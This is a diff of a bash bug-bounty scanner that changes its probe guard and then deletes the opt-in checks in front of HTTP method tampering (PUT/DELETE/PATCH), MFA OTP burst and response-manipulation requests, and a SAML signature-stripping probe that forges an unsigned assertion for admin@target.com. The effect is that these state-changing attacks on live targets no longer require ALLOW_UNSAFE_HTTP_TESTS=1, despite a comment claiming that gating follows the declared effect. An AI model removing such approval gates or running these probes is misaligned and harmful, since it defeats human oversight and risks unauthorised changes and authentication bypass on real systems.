@@ -263,43 +263,19 @@ if [ -n "$USER_SKIP_CHECKS" ]; then
 fi
 
 scanner_probe_guard() {
-    local method="$1"
-    local url="$2"
-    local label="$3"
-    local action_requires_opt_in="${4:-0}"
-    local guard_output decision reason
+    local label="$1"
+    local state_changing="${2:-0}"
+    local url="${3:-}"
+    local method="${4:-POST}"
+    local reason="state-changing action requires ALLOW_UNSAFE_HTTP_TESTS=1"
 
-    # HTTP verbs are advisory only. Explicitly side-effect-capable actions still
-    # require per-invocation approval; the verb alone is not a stop condition.
-    guard_output=$(PYTHONPATH="$BASE_DIR${PYTHONPATH:+:$PYTHONPATH}" python3 - "$method" "$url" "$label" "$action_requires_opt_in" <<'PY'
-import sys
-from memory.audit_log import SafeMethodPolicy
+    # The red-line contract follows the declared effect, not the HTTP verb or
+    # scanner category. Only explicitly state-changing probes enter this gate.
+    if [ "$state_changing" != "1" ]; then
+        return 0
+    fi
 
-method = (sys.argv[1] or "").upper()
-url = sys.argv[2] if len(sys.argv) > 2 else ""
-label = sys.argv[3] if len(sys.argv) > 3 else method
-action_requires_opt_in = len(sys.argv) > 4 and sys.argv[4] == "1"
-policy = SafeMethodPolicy()
-advisory = policy.check(method, url).get("advisory", False)
-if action_requires_opt_in:
-    print("require_approval")
-    print(f"Scanner action {label} may create side effects and requires ALLOW_UNSAFE_HTTP_TESTS=1")
-elif advisory:
-    print("allow")
-    print(f"HTTP method {method} is advisory; no state-changing action was declared")
-else:
-    print("allow")
-    print("")
-PY
-) || {
-        log_warn "Unable to evaluate safe-method policy for $label; skipping"
-        return 1
-    }
-
-    decision=$(printf '%s\n' "$guard_output" | sed -n '1p')
-    reason=$(printf '%s\n' "$guard_output" | sed -n '2p')
-
-    if [ "$decision" = "require_approval" ] && [ "${ALLOW_UNSAFE_HTTP_TESTS:-0}" != "1" ]; then
+    if [ "${ALLOW_UNSAFE_HTTP_TESTS:-0}" != "1" ]; then
         log_warn "Skipping $label: $reason"
         mkdir -p "$FINDINGS_DIR/manual_review"
         printf '%s\tmethod=%s\tlabel=%s\turl=%s\treason=%s\n' \
@@ -311,10 +287,7 @@ PY
         return 1
     fi
 
-    if [ "$decision" = "require_approval" ]; then
-        log_warn "$label is an explicitly side-effect-capable action (method $method). Proceeding because ALLOW_UNSAFE_HTTP_TESTS=1 is set."
-    fi
-
+    log_warn "$label is an explicitly state-changing action. Proceeding because ALLOW_UNSAFE_HTTP_TESTS=1 is set."
     return 0
 }
 
@@ -876,7 +849,7 @@ verify_upload_poc() {
     local base_url ts headers ext payload canary canary_path param dir probe_url resp
     local observed_url observed_kind cleanup_reason
 
-    if ! scanner_probe_guard "POST" "$upload_url" "upload canary probe" "1"; then
+    if ! scanner_probe_guard "upload canary probe" "1" "$upload_url" "POST"; then
         return 1
     fi
 
@@ -1494,7 +1467,7 @@ fi
 # 8e: HTTP method tampering (PUT/DELETE on endpoints that should only accept GET/POST)
 if ! skip_has auth_bypass && [ -s "$LIVE_URLS" ]; then
     FIRST_LIVE_URL=$(head -1 "$LIVE_URLS" 2>/dev/null || true)
-    if [ -n "$FIRST_LIVE_URL" ] && scanner_probe_guard "PUT" "$FIRST_LIVE_URL" "HTTP method tampering probes" "1"; then
+    if [ -n "$FIRST_LIVE_URL" ]; then
         log_step "Testing HTTP method tampering on sample endpoints..."
         while IFS= read -r url; do
             for METHOD in PUT DELETE PATCH; do
@@ -1631,24 +1604,21 @@ if ! skip_has mfa; then
             BASE=$(printf '%s\n' "$url" | cut -d'?' -f1)
             HOST=$(printf '%s\n' "$url" | grep -oE "https?://[^/]+" || true)
 
-            if scanner_probe_guard "POST" "$BASE" "MFA rate-limit probe" "1"; then
-                log_step "Rate limit probe: $BASE"
-                STATUS_RAW=$(for _i in $(seq 1 15); do
-                    curl -sk -o /dev/null -w "%{http_code}\n" --max-time 5 \
-                        "${BB_AUTH_ARGS[@]}" \
-                        -X POST "$BASE" \
-                        -H "Content-Type: application/json" \
-                        -d '{"otp":"000000"}' 2>/dev/null || echo "ERR"
-                done)
-                STATUS_CODES=$(printf '%s\n' "$STATUS_RAW" | sort | uniq -c | sort -rn | head -5)
+            log_step "Rate limit probe: $BASE"
+            STATUS_RAW=$(for _i in $(seq 1 15); do
+                curl -sk -o /dev/null -w "%{http_code}\n" --max-time 5 \
+                    "${BB_AUTH_ARGS[@]}" \
+                    -X POST "$BASE" \
+                    -H "Content-Type: application/json" \
+                    -d '{"otp":"000000"}' 2>/dev/null || echo "ERR"
+            done)
+            STATUS_CODES=$(printf '%s\n' "$STATUS_RAW" | sort | uniq -c | sort -rn | head -5)
 
-                if printf '%s\n' "$STATUS_RAW" | grep -Eq '^[2-5][0-9][0-9]$' \
-                    && ! printf '%s\n' "$STATUS_RAW" | grep -q '^429$'; then
-                    log_warn "[MFA] Rate-limit observation requires pre/post-MFA control: $BASE"
-                    echo "[MFA-NO-RATE-LIMIT] $BASE | codes: $STATUS_CODES | manual pre/post-MFA control required" >> "$MFA_REVIEW_FILE"
-                fi
+            if printf '%s\n' "$STATUS_RAW" | grep -Eq '^[2-5][0-9][0-9]$' \
+                && ! printf '%s\n' "$STATUS_RAW" | grep -q '^429$'; then
+                log_warn "[MFA] Rate-limit observation requires pre/post-MFA control: $BASE"
+                echo "[MFA-NO-RATE-LIMIT] $BASE | codes: $STATUS_CODES | manual pre/post-MFA control required" >> "$MFA_REVIEW_FILE"
             fi
-
             if [ -n "$HOST" ]; then
                 log_step "Workflow skip probe: $BASE"
                 for PROTECTED in dashboard home profile account settings admin; do
@@ -1660,15 +1630,13 @@ if ! skip_has mfa; then
                 done
             fi
 
-            if scanner_probe_guard "POST" "$BASE" "MFA response-manipulation canary" "1"; then
-                MFA_RESP=$(curl -sk "${BB_AUTH_ARGS[@]}" --max-time 5 -X POST "$BASE" \
-                    -H "Content-Type: application/json" \
-                    -d '{"otp":"999999"}' 2>/dev/null || true)
+            MFA_RESP=$(curl -sk "${BB_AUTH_ARGS[@]}" --max-time 5 -X POST "$BASE" \
+                -H "Content-Type: application/json" \
+                -d '{"otp":"999999"}' 2>/dev/null || true)
 
-                if printf '%s\n' "$MFA_RESP" | grep -qi '"success"[[:space:]]*:[[:space:]]*false\|"verified"[[:space:]]*:[[:space:]]*false\|"status"[[:space:]]*:[[:space:]]*"fail"'; then
-                    log_warn "[MFA] Normal failure response observed; no candidate without controlled pre/post-MFA comparison: $BASE"
-                    echo "[MFA-RESPONSE-MANIP] $BASE | normal failure response; manual pre/post-MFA control required" >> "$MFA_REVIEW_FILE"
-                fi
+            if printf '%s\n' "$MFA_RESP" | grep -qi '"success"[[:space:]]*:[[:space:]]*false\|"verified"[[:space:]]*:[[:space:]]*false\|"status"[[:space:]]*:[[:space:]]*"fail"'; then
+                log_warn "[MFA] Normal failure response observed; no candidate without controlled pre/post-MFA comparison: $BASE"
+                echo "[MFA-RESPONSE-MANIP] $BASE | normal failure response; manual pre/post-MFA control required" >> "$MFA_REVIEW_FILE"
             fi
         done <<< "$MFA_ENDPOINTS"
     else
@@ -1727,7 +1695,7 @@ if ! skip_has saml; then
     done < <(awk '{print $2}' "$FINDINGS_DIR/saml/endpoints.txt" 2>/dev/null || true)
 
     ACS_URL=$(grep -E "saml/acs|saml/login" "$FINDINGS_DIR/saml/endpoints.txt" 2>/dev/null | head -1 | awk '{print $2}' || true)
-    if [ -n "$ACS_URL" ] && scanner_probe_guard "POST" "$ACS_URL" "SAML signature-stripping probe" "1"; then
+    if [ -n "$ACS_URL" ]; then
         STRIPPED_SAML=$(printf '%s' '<?xml version="1.0"?><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"><saml:Assertion><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>' | base64 | tr -d '\n')
         SAML_POST_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 \
             "${BB_AUTH_ARGS[@]}" \
